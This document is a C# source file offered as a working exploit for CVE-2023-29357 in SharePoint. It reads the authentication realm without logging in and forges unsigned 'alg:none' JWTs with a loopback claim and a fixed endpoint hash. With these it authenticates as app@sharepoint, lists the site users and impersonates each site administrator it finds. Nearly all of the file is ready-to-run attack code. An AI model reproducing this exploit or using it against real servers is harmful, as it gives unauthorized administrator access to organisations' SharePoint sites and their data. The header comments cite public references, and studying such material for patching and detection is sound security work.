// CVE-2023-29357 SharePoint Exploit by @LuemmelSec
// Build with .Net Version 4.7.2 in Visual Studio 2017 as C# Console Application
// References:
// https://github.com/Chocapikk/CVE-2023-29357
// https://testbnull.medium.com/p2o-vancouver-2023-v%C3%A0i-d%C3%B2ng-v%E1%BB%81-sharepoint-pre-auth-rce-chain-cve-2023-29357-cve-2023-24955-ed97dcab131e
// Exploit steps
// Fetch the Realm unauthenticated from /_api/web/siteusers
// Forge a JWT with the Realm to authenticate as app@sharepoint User 
// Fetch all users from /_api/web/siteusers as app@sharepoint
// Look for Users with SiteAdmin = True 
// Forge a JWT for all of them with their NameId and NameIdIssuer
// Impersonate them and make a request to /_api/web/currentuser to proof impersonation

using System;
using System.IdentityModel.Tokens.Jwt;
using System.Net.Http;
using System.Text;
using Newtonsoft.Json;
using System.Xml.Linq;
using System.Linq;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: CVE-2023-29357.exe http(s)://yoursharepoint.lol [-v]");
            return;
        }

        string url = args[0];
        string apiUrl = url.TrimEnd('/') + "/_api/web/siteusers";
        bool verbose = args.Length > 1 && args[1] == "-v";

        using (var httpClient = new HttpClient())
        {
            try
            {
                httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer");

                HttpResponseMessage response = httpClient.GetAsync(apiUrl).Result;

                Console.WriteLine($"Response Status Code unauthenticated against /_api/web/siteusers to fetch the Realm should be Unauthorized: {response.StatusCode}");

                if (verbose)
                {
                    Console.WriteLine("Response Headers:");
                    foreach (var header in response.Headers)
                    {
                        Console.WriteLine($"{header.Key}: {string.Join(", ", header.Value)}");
                    }
                }

                if (response.Headers.TryGetValues("WWW-Authenticate", out var authHeaderValues))
                {
                    foreach (var authHeaderValue in authHeaderValues)
                    {
                        if (authHeaderValue.Contains("realm="))
                        {
                            string realm = authHeaderValue.Split(new[] { "realm=\"" }, StringSplitOptions.None)[1].Split('"')[0];
                            if (!string.IsNullOrEmpty(realm))
                            {
                                Console.ForegroundColor = ConsoleColor.Green;
                                Console.WriteLine($"Realm found in response headers: {realm}");
                                Console.ResetColor();
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"Realm NOT found in response headers!!!");
                                Console.ResetColor();
                            }

                            // Generate JWT
                            string jwtToken = GenerateJwt(realm);

                            // Use JWT for the Authorization and X-PROOF_TOKEN headers
                            httpClient.DefaultRequestHeaders.Remove("Authorization");
                            httpClient.DefaultRequestHeaders.Remove("X-PROOF_TOKEN");
                            httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {jwtToken}");
                            httpClient.DefaultRequestHeaders.Add("X-PROOF_TOKEN", jwtToken);

                            // Make a request with the JWT to /_api/web/currentuser
                            response = httpClient.GetAsync(url.TrimEnd('/') + "/_api/web/currentuser").Result;

                            Console.WriteLine($"Response Status Code with spoofed JWT against /_api/web/currentuser: {response.StatusCode}");

                            if (verbose)
                            {
                                Console.WriteLine("Response Headers with spoofed JWT against /_api/web/currentuser:");
                                foreach (var header in response.Headers)
                                {
                                    Console.WriteLine($"{header.Key}: {string.Join(", ", header.Value)}");
                                }

                                // Print the formatted response body
                                var responseBody = FormatXml(response.Content.ReadAsStringAsync().Result);
                                Console.WriteLine($"Response Body with spoofed JWT against /_api/web/currentuser: {responseBody}");
                            }

                            // Now, make a request with the same JWTs to /_api/web/siteusers
                            response = httpClient.GetAsync(url.TrimEnd('/') + "/_api/web/siteusers").Result;

                            Console.WriteLine($"Response Status Code with spoofed JWT against /_api/web/siteusers: {response.StatusCode}");

                            if (verbose)
                            {
                                Console.WriteLine("Response Headers with spoofed JWT against /_api/web/siteusers:");
                                foreach (var header in response.Headers)
                                {
                                    Console.WriteLine($"{header.Key}: {string.Join(", ", header.Value)}");
                                }

                                // Print the formatted response body
                                var responseBodySiteUsersVerbose = FormatXml(response.Content.ReadAsStringAsync().Result);
                                Console.WriteLine($"Response Body with spoofed JWT against /_api/web/siteusers: {responseBodySiteUsersVerbose}");
                                            
                            }
                            // Define namespaces
                            XNamespace d = "http://schemas.microsoft.com/ado/2007/08/dataservices";
                            XNamespace m = "http://schemas.microsoft.com/ado/2007/08/dataservices/metadata";

                            // Parse the XML and find users with IsSiteAdmin=true
                            var responseBodySiteUsers = FormatXml(response.Content.ReadAsStringAsync().Result);
                            var xDoc = XDocument.Parse(responseBodySiteUsers);
                            var isAdminUsers = xDoc.Descendants(m + "properties")
                                .Where(e => e.Elements(d + "IsSiteAdmin").Any(el => el.Value == "true"))
                                .Select(e => e.Parent) // Go up to the 'entry' element
                                .ToList();

                            // Print the XML part of users with IsSiteAdmin=true
                            foreach (var isAdminUser in isAdminUsers)
                            {
                                var loginName = isAdminUser.Element(m + "properties")?.Element(d + "LoginName")?.Value;
                                var nameId = isAdminUser.Element(m + "properties")?.Element(d + "UserId")?.Element(d + "NameId")?.Value;
                                var nameIdIssuer = isAdminUser.Element(m + "properties")?.Element(d + "UserId")?.Element(d + "NameIdIssuer")?.Value;

                                // Check if loginName and nameId are not empty
                                if (!string.IsNullOrEmpty(loginName) && !string.IsNullOrEmpty(nameId))
                                {
                                    Console.ForegroundColor = ConsoleColor.Green;
                                    Console.WriteLine("Site-Admin found");
                                    Console.WriteLine($"LoginName: {loginName}");
                                    Console.WriteLine($"NameId: {nameId}");
                                    Console.WriteLine($"NameIdIssuer: {nameIdIssuer}");

                                    // Generate JWT with specific nameId and nameIdIssuer
                                    string jwtToken_SiteAdmin = GenerateJwt(realm, nameId, nameIdIssuer);

                                    // Reset Request Headers and use the spoofed Admin JWT to authenticate
                                    httpClient.DefaultRequestHeaders.Remove("Authorization");
                                    httpClient.DefaultRequestHeaders.Remove("X-PROOF_TOKEN");
                                    httpClient.DefaultRequestHeaders.Add("Authorization", $"Bearer {jwtToken_SiteAdmin}");
                                    httpClient.DefaultRequestHeaders.Add("X-PROOF_TOKEN", jwtToken_SiteAdmin);
                                    // Make a request with the new JWT to /_api/web/currentuser
                                    response = httpClient.GetAsync(url.TrimEnd('/') + "/_api/web/currentuser").Result;
                                    Console.ResetColor();

                                    // Print the response status code against /_api/web/currentuser
                                    Console.WriteLine($"Response Status Code against /_api/web/currentuser as SiteAdmin: {response.StatusCode}");

                                    // Parse the XML to get the LoginName
                                    var responseBodyCurrentUser_SiteAdmin = FormatXml(response.Content.ReadAsStringAsync().Result);
                                    var xDocCurrentUser = XDocument.Parse(responseBodyCurrentUser_SiteAdmin);
                                    var loginNameSiteAdmin = xDocCurrentUser.Descendants(m + "properties").FirstOrDefault()?.Element(d + "LoginName")?.Value;

                                    // Print the LoginName
                                    if (!string.IsNullOrEmpty(realm))
                                    {
                                        Console.ForegroundColor = ConsoleColor.Green;
                                        Console.WriteLine($"Now running as SiteAdmin: {loginNameSiteAdmin}");
                                        Console.ResetColor();
                                    }
                                    else
                                    {
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.WriteLine($"Error. Could not parse the SiteAdmin User!");
                                        Console.ResetColor();
                                    }


                                    if (verbose)
                                    {
                                        Console.WriteLine("Response Headers against /_api/web/currentuser as SiteAdmin:");
                                        foreach (var header in response.Headers)
                                        {
                                            Console.WriteLine($"{header.Key}: {string.Join(", ", header.Value)}");
                                        }

                                        // Print the formatted response body
                                        var responseBodyCurrentUser = FormatXml(response.Content.ReadAsStringAsync().Result);
                                        Console.WriteLine($"Response Body against /_api/web/currentuser as SiteAdmin: {responseBodyCurrentUser}");
                                    }

                                    // Reset color to default
                                    Console.ResetColor();
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.Red;
                                    Console.WriteLine("Sorry, no Site-Admin found!");
                                    // Reset color to default
                                    Console.ResetColor();
                                }

                                // Reset color to default
                                Console.ResetColor();
                            }
                            return;
                        }
                    }
                }

                Console.WriteLine("Realm not found in WWW-Authenticate header.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }

    static string GenerateJwt(string realm)
    {
        // Set current time and expiration time
        DateTime now = DateTime.UtcNow;
        DateTime expirationTime = now.AddHours(1);

        // Create JWT payload
        var payload = new
        {
            aud = $"00000003-0000-0ff1-ce00-000000000000@{realm}",
            iss = "00000003-0000-0ff1-ce00-000000000000",
            nbf = (int)now.Subtract(new DateTime(1970, 1, 1)).TotalSeconds,
            exp = (int)expirationTime.Subtract(new DateTime(1970, 1, 1)).TotalSeconds,
            ver = "hashedprooftoken",
            nameid = $"00000003-0000-0ff1-ce00-000000000000@{realm}",
            //endpointurl parameter is calculated as base64_encode(sha256(request_url)). By just giving it "h" and set endpointurl Length = 1 this is valid and true for the SharePoint code. URL needs to be lowercase!
            //can use CyberChef with SHA256 / 64 rounds -> From Hex / Delimiter Auto -> To Base64   ===   https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)From_Hex('Auto')To_Base64('A-Za-z0-9%2B/%3D')&input=aA
            endpointurl = "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
            endpointurlLength = 1,
            isloopback = true,
        };

        var handler = new JwtSecurityTokenHandler();

        // Encode header and payload
        var encodedHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes("{\"alg\":\"none\"}")).TrimEnd('=');
        var encodedPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(payload))).TrimEnd('=');

        // Concatenate header and payload with a period
        var jwtToken = $"{encodedHeader}.{encodedPayload}.AAA";

        return jwtToken;
    }

    static string GenerateJwt(string realm, string targetNameId, string targetNameIdIssuer)
    {
        // Set current time and expiration time
        DateTime now = DateTime.UtcNow;
        DateTime expirationTime = now.AddHours(1);

        // Create JWT payload
        var payload = new
        {
            aud = $"00000003-0000-0ff1-ce00-000000000000@{realm}",
            iss = "00000003-0000-0ff1-ce00-000000000000",
            nbf = (int)now.Subtract(new DateTime(1970, 1, 1)).TotalSeconds,
            exp = (int)expirationTime.Subtract(new DateTime(1970, 1, 1)).TotalSeconds,
            ver = "hashedprooftoken",
            nameid = targetNameId,
            endpointurl = "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
            endpointurlLength = 1,
            isloopback = true,
            nii = targetNameIdIssuer, // Additional claim for NameIdIssuer
            isuser = "True" // Additional claim for isuser
        };

        var handler = new JwtSecurityTokenHandler();

        // Encode header and payload
        var encodedHeader = Convert.ToBase64String(Encoding.UTF8.GetBytes("{\"alg\":\"none\"}")).TrimEnd('=');
        var encodedPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(payload))).TrimEnd('=');

        // Concatenate header and payload with a period
        var jwtToken = $"{encodedHeader}.{encodedPayload}.AAA";

        return jwtToken;
    }

    // Helper method to format XML
    static string FormatXml(string xml)
    {
        var doc = XDocument.Parse(xml);
        return doc.ToString();
    }
}
